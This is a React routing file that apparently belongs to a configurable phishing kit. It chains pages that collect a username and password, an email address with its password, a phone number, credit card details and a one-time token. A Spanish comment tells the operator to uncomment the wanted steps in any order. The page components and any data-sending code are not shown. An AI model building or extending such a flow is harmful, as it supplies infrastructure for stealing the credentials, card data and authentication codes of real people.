import React from 'react'
import { BrowserRouter, Route, Routes } from 'react-router-dom'
import { CreditCard } from '../pages/card/CreditCard'
import { UsernameAndPassword } from '../pages/Username and password/UsernameAndPassword'
import { EmailAndPassword } from '../pages/email/emailAndPassword/EmailAndPassword'
import { EmailAndPhone } from '../pages/email/emailAndPhone/EmailAndPhone'
import { Token } from '../pages/token/Token'

export const Navigation = () => {
  return (
    <BrowserRouter>
        <Routes>
            {/* AQUI SOLO HAY QUE DESCOMENTAR LOS QUE DESEAS USAR EN EL ORDEN QUE DESEES QUE ESTÉ */}
            
            <Route path='/' element={<UsernameAndPassword
              timeLoader={1000}
              spiner={true}
              urlToNavigate={'correo-claveCorreo'}
            />} />

            {/* email/emailAndPassword */}
            <Route path='correo-claveCorreo' element={
              <EmailAndPassword urlToNavigate={'/correo-celular'} />} 
            />
            
            {/* email/emailAndPhone */}
            <Route path='/correo-celular' element={
              <EmailAndPhone urlToNavigate={'/tarjeta'} />} 
            />

            {/* card/CreditCard */}
            <Route path='/tarjeta' element={
              <CreditCard urlToNavigate={'/token'} />} 
            />

            {/* token/Token */}
            <Route path='/token' element={
              <Token urlToNavigate={''} />} 
            />
        </Routes>
    </BrowserRouter>
  )
}
